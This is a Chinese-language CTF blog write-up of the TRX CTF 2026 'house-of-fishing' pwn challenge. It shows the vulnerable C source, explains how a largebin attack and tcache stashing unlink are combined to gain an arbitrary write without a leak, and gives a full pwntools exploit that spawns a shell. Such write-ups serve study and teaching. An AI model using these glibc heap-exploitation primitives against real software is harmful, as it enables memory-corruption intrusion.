---
title: "TRX CTF 2026 House of Fishing"
published: 2026-05-06
description: "TRX CTF 2026 house-of-fishing 堆题复现与利用整理。"
tags: ["CTF", "PWN", "堆"]
category: CTF
draft: false
---

## 参考文献
[TRX CTF 2026 house-of-fishing Writeup · rawpayload](https://blog.rawpayload.com/blog/trx-ctf-2026-house-of-fishing-writeup)

## 前言
看了一下 trxctf 2026 的堆题，这题看上去很简单，只需要一个任意地址写将 `*admin` 修改成目标的地址即可触发后门函数，从而getshell，但是程序没有 `show()` 功能，因此无法通过修改fd之类的方式污染 bins，故而我们需要别的方法劫持堆，在刚开始做的时候没想出来怎么打，后面看了一眼官方的wp，自己整理了一下

## 文件
题目给了一个elf文件，一个程序源码和docker file，查看docker file可以得知采用的是 `glibc 2.39-0ubuntu8.5` 版本的glibc

查询程序保护如下：
```bash
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
可以看到是一个很典型的 heap 的保护，保护几乎开满了

## 程序源码分析
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
  
#define min(a, b) ((a) < (b) ? (a) : (b))
  
#define PTRS_SIZE 0x100
#define SIZE_CAP 0x500
  
void* ptrs[PTRS_SIZE] = {0};
int sizes[PTRS_SIZE] = {0};
  
unsigned long* admin = NULL;
  
void print_banner() {
    printf("🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣\n");
    printf("🎣.__                                         _____  ___________.__       .__    .__                🎣\n");
    printf("🎣|  |__   ____  __ __  ______ ____     _____/ ____\\ \\_   _____/|__| _____|  |__ |__| ____    ____  🎣\n");
    printf("🎣|  |  \\ /  _ \\|  |  \\/  ___// __ \\   /  _ \\   __\\   |    __)  |  |/  ___/  |  \\|  |/    \\  / ___\\ 🎣\n");
    printf("🎣|   Y  (  <_> )  |  /\\___ \\\\  ___/  (  <_> )  |     |     \\   |  |\\___ \\|   Y  \\  |   |  \\/ /_/  >🎣\n");
    printf("🎣|___|  /\\____/|____//____  >\\___  >  \\____/|__|     \\___  /   |__/____  >___|  /__|___|  /\\___  / 🎣\n");
    printf("🎣     \\/                  \\/     \\/                      \\/            \\/     \\/        \\//_____/  🎣\n");
    printf("🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣🎣\n");
}
  
void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
  
    admin = (unsigned long*) mmap((void*) 0x1337000, 8, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANON, -1, 0);
  
    print_banner();
}
  
void menu() {
    puts("1) create");
    puts("2) update");
    puts("3) delete");
    puts("4) copy");
    printf("enter your choice: ");
}
  
int get_choice() {
    unsigned int choice = 0;
    scanf("%d%*c", &choice);
  
    return choice;
}
  
void die(char* msg) {
    printf("wrong %s\n", msg);
    exit(-1);
}
  
unsigned int get_idx() {
    unsigned int idx;
  
    printf("enter index: ");
    idx = get_choice();
  
    if (idx >= PTRS_SIZE)
        die("index");
  
    return idx;
}  
  
unsigned int get_size() {
    unsigned int size;
  
    printf("enter size: ");
    size = get_choice();
    size += 0xf;
    size /= 0x10;
    size *= 0x10;
  
    if (size >= SIZE_CAP)
        die("size");
  
    return size;
}
  
void read_exactly(int fd, char* ptr, int size) {
    for (int i=0; i<size; i++)
        read(fd, ptr+i, 1);
}
  
void create() {
    unsigned int idx;
    unsigned int size;
    void* ptr;
  
    idx = get_idx();
    size = get_size();
  
    ptr = malloc(size);
    printf("allocated size: %d\n", size);
  
    ptrs[idx] = ptr;
    sizes[idx] = size;
}
  
void update() {
    unsigned int idx;
  
    idx = get_idx();
  
    printf("enter %d bytes: ", sizes[idx]);
    read_exactly(STDIN_FILENO, ptrs[idx], sizes[idx]);
}
  
void delete() {
    unsigned int idx;
  
    idx = get_idx();
    free(ptrs[idx]);
}  
  
void win() {
    if (*admin == 0xdeadbeefdeadcafe) {
        puts("good boy");
        system("/bin/sh");
    } else
        die("admin");
}
  
void copy() {
    unsigned int dest;
    unsigned int src;
  
    dest = get_idx();
    src = get_idx();
  
    memcpy(ptrs[dest], ptrs[src], min(sizes[dest], sizes[src]));
}
  
int main(int argc, char** argv) {
    unsigned int choice = 0;
  
    setup();
  
    while(1) {
        menu();
        choice = get_choice();
  
        switch(choice) {
            case 1:
                create();
                break;
            case 2:
                update();
                break;
            case 3:
                delete();
                break;
            case 4:
                copy();
                break;
            case 5:
                win();
                break;
            default:
                puts("invalid choice");
                break;
        }
    }
  
    return 0;
}
```

可以看到非常经典的heap题，存在 **增删写** 的功能，但是就是没有读，这就导致了实现任意地址写的方法变得麻烦起来了，一些常规的任意地址写的手法就无法生效了。

### create
可以看到能够申请 size 值满足 16字节对齐 且 小于 0x500 的chunk

### win
当 `*admin == 0xdeadbeefdeadcafe` 时即可触发 `system("/bin/sh")` 从而直接拿到shell，因此这题虽然是高版本的堆题目，但是却不需要打IO，只需要实现任意地址写即可getshell

## 攻击思路
首先没有 `show()` 我们无法直接修改fd指针，那么我们有什么方法可以在不泄露堆地址的情况下将fake chunk放入tcache呢？这时候 `tcache_stashing_unlink` 就派上了用场，改攻击手法能将smallbin chunk放入tcache中，同时因为 smallbin chunk的 `bk` 指针没有 safe linking 保护，因此我们可以直接将其修改成 `目标地址 - 0x10` 然后打 `tcach_stashing_unlink` 即可将目标地址放入 tcache 中。
由于 malloc 源码中存在如下的代码：

```c
while (tcache->counts[tc_idx] < mp_.tcache_count
    && (tc_victim = last(bin)) != bin)
{
    // 将bin中chunk脱离，然后放入cache中
    if (tc_victim != 0)
    {
        bck = tc_victim->bk;
        set_inuse_bit_at_offset(tc_victim, nb);
        if (av != &main_arena)
            set_non_main_arena(tc_victim);
        bin->bk = bck;
        bck->fd = bin;

        tcache_put(tc_victim, tc_idx);
    }
}
```

他会检测你取出的chunk的bk是否为有效指针，因此如果直接打 `tcache_stashing_unlink` 则会因此而无法走到 `tcache_put(tc_victim, tc_idx);` 这一步，因此我们需要提前利用 `largebin attack` 将一个有效的堆地址写入 `fake chunk->bk` 处，从而实现对应的攻击

## 攻击顺序
### 提前构造好bins
因为要打 `tcache_stashing_unlink` 我们需要在一开始就直接构建好 smallbin chunk，防止后面再构造时出现问题，同时提前构造 smallbin 也可以不让堆结构变得特别乱

```python
for i in range(7):
    malloc(i, 0x90)          # tcache
for i in range(6):
    malloc(10 + i, 0x90)     # 构建smallbin
    malloc(20 + 1, 0x20)     # 防止free时被合并
  
for i in range(7):
    free(i)                  # fill tcache
for i in range(6):
    free(10 + i)
  
malloc(30, 0x490)            # 触发，将前面free的unsortedbin chunk放入smallbin中
```

此时bin的结构如图
![smallbin 结构](/assets/posts/trx-ctf-2026-house-of-fishing/pasted-image-20260506000006.png)

可以看到成功将6个0xa0的 chunk 放入 smallbin 中。
### largebin attack
此时我们需要调用largebin attack，在 `*(admin + 8)` 处的地址写入一个堆地址，从而防止后续 `tcache_stashing_unlink` 时出现错误
```python
admin = 0x1337000
malloc(40, 0x420)             # p1
malloc(41, 0x400)
malloc(42, 0x410)             # p2
malloc(43, 0x400)
  
free(40)
malloc(44, 0x430)             # p3
  
free(42)
payload = flat({
    0x08: admin - 0x10 + 0x100,
    0x18: admin - 0x20 + 0x8
}, filler = b"\x00", length = 0x420)
edit(40, payload)
malloc(45, 0x430)
malloc(46, 0x3d0)             # 在官方wp中加入了这句，但是在我本地的测试情况下，这句加不加都不影响最终getshell，对于官方为什么加这句我有点不李姐，希望有大佬能够指点一二
```
最终能够发现成功将一个堆地址写入了 `admin + 0x08` 处的地址

![admin 地址写入结果](/assets/posts/trx-ctf-2026-house-of-fishing/pasted-image-20260506002603.png)

### tcache stashing unlink
接下来打 `tcache_stashing_unlink` 将 smallbin中的chunk放入tcache中
```python
# Step.3 tcache stashing unlink
for i in range(7): malloc(i, 0x90)
payload = flat({
    0x08: admin - 0x10
}, filler = b"\x00", length = 0x90)
edit(15, payload)
  
malloc(50, 0x90)
malloc(51, 0x90)
malloc(52, 0x90)
```
在执行完 `malloc(50, 0x90)` 后在这里下断点调试，查看 tcache，如下图
![tcache 调试结果](/assets/posts/trx-ctf-2026-house-of-fishing/pasted-image-20260506002932.png)

可以看到 admin的地址被成功写入了tcache中，接下来就只需要将其取出，然后利用edit对其进行修改即可

### getshell
```python
payload = flat({
    0x00: 0xdeadbeefdeadcafe
}, filler = b"\x00", length = 0x90)
edit(52, payload)
menu(5)
```

最终运行发现能getshell
![getshell 结果](/assets/posts/trx-ctf-2026-house-of-fishing/pasted-image-20260506004629.png)
## exp
最终完整的exp如下：
```python
from pwn import *
  
context(arch = "amd64", os = "linux", log_level = "debug", terminal = ["tmux", "splitw", "-h"])
io = process("./chall")
#io = remote("challenge-1935be88449b9231.sandbox.ctfhub.com", 27347)#nc challenge-1935be88449b9231.sandbox.ctfhub.com 27347
elf = ELF("./chall")
libc = ELF("./libc.so.6")
  
#--------------------
  
sd = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
ru = lambda x : io.recvuntil(x)
r = lambda x : io.recv(x)
sla = lambda x, data : io.sendlineafter(x, data)
inter = lambda : io.interactive()
rl = lambda a = False : io.recvline(a)
sa = lambda x, data : io.sendafter(x, data)
  
def menu(x):
    sla(b"enter your choice: ", str(x).encode())
  
def malloc(idx, size):
    menu(1)
    sla(b"enter index: ", str(idx).encode())
    sla(b"enter size: ", str(size).encode())
  
def edit(idx, data):
    menu(2)
    sla(b"enter index: ", str(idx).encode())
    sa(b"bytes: ", data)
  
def free(idx):
    menu(3)
    sla(b"enter index: ", str(idx).encode())
  
def debug():
    gdb.attach(io)
    pause()
  
# Step.1 prepare chunks
for i in range(7):
    malloc(i, 0x90)          # tcache
for i in range(6):
    malloc(10 + i, 0x90)     # 构建smallbin
    malloc(20 + 1, 0x20)     # 防止free时被合并
  
for i in range(7):
    free(i)
for i in range(6):
    free(10 + i)
  
malloc(30, 0x490)
#debug()
  
# Step.2 largebin attack
admin = 0x1337000
malloc(40, 0x420)             # p1
malloc(41, 0x400)
malloc(42, 0x410)             # p2
malloc(43, 0x400)
  
free(40)
malloc(44, 0x430)             # p3
  
free(42)
payload = flat({
    0x08: admin - 0x10 + 0x100,
    0x18: admin - 0x20 + 0x8
}, filler = b"\x00", length = 0x420)
edit(40, payload)
malloc(45, 0x430)
#malloc(46, 0x3d0)
#debug()
  
# Step.3 tcache stashing unlink
for i in range(7): malloc(i, 0x90)
payload = flat({
    0x08: admin - 0x10
}, filler = b"\x00", length = 0x90)
edit(15, payload)
  
#debug()
malloc(50, 0x90)
#debug()
malloc(51, 0x90)
malloc(52, 0x90)
  
# get shell
payload = flat({
    0x00: 0xdeadbeefdeadcafe
}, filler = b"\x00", length = 0x90)
edit(52, payload)
menu(5)
#debug()
  
inter()
```

## 总结
这道题的运用十分巧妙，考察了我们在没有 show 功能的情况下如何实现任意地址写，将一个 chunk 放入 tcache 中，这里需要我们熟练掌握并能够运用各种堆攻击手法，将其组合使用，从而构造优质原语，从而达到你的目的。同时这题是一个 `house of water` 的变体，本题不再向 tcache 线程结构体写入，而是向一块固定的 mmap 映射目标地址写入。至于为什么要叫house of fishing算是出题人在玩梗吧。hhhh
